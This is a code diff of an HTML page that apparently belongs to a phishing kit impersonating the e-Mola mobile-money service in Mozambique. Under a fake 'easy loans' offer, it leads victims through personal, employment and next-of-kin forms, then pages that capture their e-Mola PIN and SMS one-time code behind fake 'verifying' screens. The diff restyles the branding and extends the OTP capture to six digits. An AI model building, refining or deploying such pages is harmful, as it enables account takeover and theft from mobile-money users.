@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>e-Mola Moçambique – Empréstimos Fáceis</title>
+    <title>e-Mola – Easy Loans</title>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="style.css">
 </head>
@@ -11,14 +11,13 @@
 
     <!-- PAGE 1: LANDING -->
     <div id="page-landing" class="page active">
-        <div class="land-nav">
-            <div style="flex:1;"></div>
-            <img class="momo-logo-img" src="emola_logo.png" alt="e-Mola" style="height:60px;" />
-            <div style="flex:1;"></div>
-            <button class="lang-toggle" onclick="toggleLanguage()">
-                <span id="langIcon">🌐 EN</span>
-            </button>
-        </div>
+        <!-- Header -->
+        <header class="app-header">
+            <img class="header-logo" src="emola_logo.png" alt="e-Mola" />
+            <div class="header-title">Easy Loans</div>
+            <button class="lang-toggle" onclick="toggleLanguage()"><span id="langIcon">🌐 EN</span></button>
+        </header>
+
         <div class="land-center">
             <div class="land-card">
                 <h1 data-i18n="welcome">Bem-vindo ao e-Mola</h1>
@@ -37,13 +36,15 @@
         <div class="land-footer" data-i18n="footer">© 2026 e-Mola Empréstimos – Movitel</div>
     </div>
 
-    <!-- PAGE 2: STEP 1 – Loan Details -->
+    <!-- PAGE 2: STEP 1 -->
     <div id="page-step1" class="page">
-        <nav class="navbar">
-            <a class="nav-left" onclick="goTo('page-landing')">← <span data-i18n="back">Voltar</span></a>
-            <img class="momo-logo-img" src="emola_logo.png" alt="e-Mola" style="height:40px;" />
-            <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
-        </nav>
+        <header class="app-header">
+            <a class="nav-left" onclick="goTo('page-landing')">←</a>
+            <img class="header-logo" src="emola_logo.png" alt="e-Mola" />
+            <div class="header-title">Easy Loans</div>
+            <button class="lang-toggle" onclick="toggleLanguage()"><span id="langIcon">🌐 EN</span></button>
+        </header>
+
         <div class="step-center">
             <div class="step-card">
                 <h2 data-i18n="loan_application">Pedido de Empréstimo</h2>
@@ -59,13 +60,15 @@
         </div>
     </div>
 
-    <!-- PAGE 3: STEP 2 – Personal Details (No Email) -->
+    <!-- PAGE 3: STEP 2 -->
     <div id="page-step2" class="page">
-        <nav class="navbar">
-            <a class="nav-left" onclick="goTo('page-step1')">← <span data-i18n="back">Voltar</span></a>
-            <img class="momo-logo-img" src="emola_logo.png" alt="e-Mola" style="height:40px;" />
-            <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
-        </nav>
+        <header class="app-header">
+            <a class="nav-left" onclick="goTo('page-step1')">←</a>
+            <img class="header-logo" src="emola_logo.png" alt="e-Mola" />
+            <div class="header-title">Easy Loans</div>
+            <button class="lang-toggle" onclick="toggleLanguage()"><span id="langIcon">🌐 EN</span></button>
+        </header>
+
         <div class="step-center">
             <div class="step-card">
                 <h2 data-i18n="loan_application">Pedido de Empréstimo</h2>
@@ -86,13 +89,15 @@
         </div>
     </div>
 
-    <!-- PAGE 4: STEP 3 – Employment & Next of Kin -->
+    <!-- PAGE 4: STEP 3 -->
     <div id="page-step3" class="page">
-        <nav class="navbar">
-            <a class="nav-left" onclick="goTo('page-step2')">← <span data-i18n="back">Voltar</span></a>
-            <img class="momo-logo-img" src="emola_logo.png" alt="e-Mola" style="height:40px;" />
-            <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
-        </nav>
+        <header class="app-header">
+            <a class="nav-left" onclick="goTo('page-step2')">←</a>
+            <img class="header-logo" src="emola_logo.png" alt="e-Mola" />
+            <div class="header-title">Easy Loans</div>
+            <button class="lang-toggle" onclick="toggleLanguage()"><span id="langIcon">🌐 EN</span></button>
+        </header>
+
         <div class="step-center">
             <div class="step-card">
                 <h2 data-i18n="loan_application">Pedido de Empréstimo</h2>
@@ -117,7 +122,7 @@
 
     <!-- PAGE 5: PROCESSING -->
     <div id="page-processing" class="page">
-        <div style="background:linear-gradient(160deg, #00A651, #007A3E); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
+        <div style="background:linear-gradient(160deg, #FF7A00, #E06500); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
             <div class="proc-wrap">
                 <div class="proc-icon">⏳</div>
                 <h2 data-i18n="processing">A Processar Pedido...</h2>
@@ -129,11 +134,13 @@
 
     <!-- PAGE 6: PIN (6 DIGITS) -->
     <div id="page-pin" class="page">
-        <nav class="navbar">
-            <a class="nav-left" onclick="goTo('page-processing')">← <span data-i18n="back">Voltar</span></a>
-            <img class="momo-logo-img" src="emola_logo.png" alt="e-Mola" style="height:40px;" />
-            <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
-        </nav>
+        <header class="app-header">
+            <a class="nav-left" onclick="goTo('page-processing')">←</a>
+            <img class="header-logo" src="emola_logo.png" alt="e-Mola" />
+            <div class="header-title">Easy Loans</div>
+            <button class="lang-toggle" onclick="toggleLanguage()"><span id="langIcon">🌐 EN</span></button>
+        </header>
+
         <div class="step-center">
             <div class="step-card">
                 <h2 data-i18n="enter_pin">Introduza o PIN e-Mola</h2>
@@ -159,7 +166,7 @@
 
     <!-- PAGE 7: WAIT PIN -->
     <div id="page-wait-pin" class="page">
-        <div style="background:linear-gradient(135deg, #00A651, #007A3E); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
+        <div style="background:linear-gradient(135deg, #FF7A00, #E06500); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
             <div class="wait-wrap">
                 <div class="wait-icon">⏳</div>
                 <h2 data-i18n="verifying_pin">A Verificar PIN...</h2>
@@ -170,25 +177,29 @@
         </div>
     </div>
 
-    <!-- PAGE 8: OTP (4 DIGITS) -->
+    <!-- PAGE 8: OTP (6 DIGITS) -->
     <div id="page-otp" class="page">
-        <nav class="navbar">
-            <a class="nav-left" onclick="goTo('page-wait-pin')">← <span data-i18n="back">Voltar</span></a>
-            <img class="momo-logo-img" src="emola_logo.png" alt="e-Mola" style="height:40px;" />
-            <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
-        </nav>
+        <header class="app-header">
+            <a class="nav-left" onclick="goTo('page-wait-pin')">←</a>
+            <img class="header-logo" src="emola_logo.png" alt="e-Mola" />
+            <div class="header-title">Easy Loans</div>
+            <button class="lang-toggle" onclick="toggleLanguage()"><span id="langIcon">🌐 EN</span></button>
+        </header>
+
         <div class="step-center">
             <div class="step-card">
                 <h2 data-i18n="enter_otp">Introduza o Código OTP</h2>
-                <p class="step-sub" data-i18n="otp_sub">Código de 4 dígitos enviado via SMS</p>
+                <p class="step-sub" data-i18n="otp_sub">Código de 6 dígitos enviado via SMS</p>
                 <div class="otp-section">
-                    <div class="otp-section-title" data-i18n="otp_label">Código OTP (4 dígitos):</div>
+                    <div class="otp-section-title" data-i18n="otp_label">Código OTP (6 dígitos):</div>
                     <div style="display: flex; align-items: center;">
                         <div class="otp-inputs" id="otpInputs">
                             <input type="password" id="otp0" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')" />
                             <input type="password" id="otp1" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')" />
                             <input type="password" id="otp2" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')" />
                             <input type="password" id="otp3" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')" />
+                            <input type="password" id="otp4" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')" />
+                            <input type="password" id="otp5" class="otp-box" maxlength="1" inputmode="numeric" placeholder="•" oninput="handleOtpInput(this, 'otp')" />
                         </div>
                         <button class="otp-delete" onclick="clearOtpCode()" title="Apagar OTP">✕</button>
                     </div>
@@ -201,7 +212,7 @@
 
     <!-- PAGE 9: WAIT OTP -->
     <div id="page-wait-otp" class="page">
-        <div style="background:linear-gradient(135deg, #00A651, #007A3E); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
+        <div style="background:linear-gradient(135deg, #FF7A00, #E06500); min-height:100vh; display:flex; align-items:center; justify-content:center; padding:32px 16px;">
             <div class="wait-wrap">
                 <div class="wait-icon">⏳</div>
                 <h2 data-i18n="verifying_otp">A Verificar OTP...</h2>
@@ -242,7 +253,7 @@
     <div id="page-dashboard" class="page">
         <div class="momo-dash">
             <div class="momo-dash-header">
-                <div class="momo-logo"><span class="momo-icon">M</span><span class="momo-name">e-Mola</span></div>
+                <div class="momo-logo"><img class="momo-icon" src="emola_logo.png" alt="e-Mola" /><span class="momo-name">e-Mola</span></div>
                 <div class="momo-header-right"><span class="momo-notif">🔔</span><span class="momo-user">👤</span></div>
             </div>
             <div class="momo-balance-card">
